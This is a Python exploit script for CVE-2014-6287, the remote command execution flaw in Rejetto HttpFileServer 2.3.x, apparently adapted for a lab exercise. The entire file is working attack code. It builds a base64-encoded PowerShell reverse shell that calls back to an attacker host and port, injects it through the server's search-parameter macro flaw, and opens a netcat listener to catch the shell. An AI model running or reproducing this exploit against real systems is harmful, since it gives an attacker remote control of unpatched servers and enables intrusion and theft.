# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution
# CVE : CVE-2014-6287
# Original Author: Ã“scar Andreu
# Edit by 20100dbg
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x

import urllib.parse
import requests
import base64
import os

#Attacker
LHOST = "10.11.80.155"
LPORT = "9001"

#Victim
RHOST = "10.10.131.223"
RPORT = "8080"

#from https://www.revshells.com/
revshell = '$c = New-Object System.Net.Sockets.TCPClient("'+ LHOST +'",'+ LPORT +');$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$c.Close()'

#we need UTF-16
revshell = revshell.encode('utf-16le')

revshell_b64 = base64.b64encode(revshell)
shell = "powershell.exe -e " + revshell_b64.decode()

res = requests.get(f'http://{RHOST}:{RPORT}/?search=%00{{.+exec|{urllib.parse.quote(shell)}+.}}')

#If the listener is too slow, start it in another shell and before this exploit
os.system("/usr/bin/nc -lvnp " + str(LPORT))
